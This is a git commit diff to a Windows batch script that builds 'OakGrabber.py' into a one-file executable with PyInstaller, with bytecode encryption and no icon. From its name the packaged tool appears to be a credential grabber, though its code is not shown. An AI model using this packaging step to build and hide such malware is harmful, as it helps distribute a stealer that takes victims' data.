d97e15075de8a1ac1680fe49d234acac1cf354b7
jotaro <93826447+j0taro@users.noreply.github.com>
2022-10-23 21:24:23 +0300

    Update build-exe.bat

--- build-exe.bat
+++ build-exe.bat
@@ -3,10 +3,10 @@
 echo dont add spaces
 set /p name="enter exe name : "
 if [%name%] NEQ [] (
-    pyinstaller --clean --onefile --key OakGrabber -n %a% oakgrabber.py
+    pyinstaller --clean --onefile -i NONE --key OakGrabber -n %name% OakGrabber.py
     rmdir /s /q __pycache__
     rmdir /s /q build
-    del /f / s /q %a%.spec
+    del /f / s /q %name%.spec
     echo exe Name: %name%.exe
     echo ur exe file generated in the dist folder
     pause
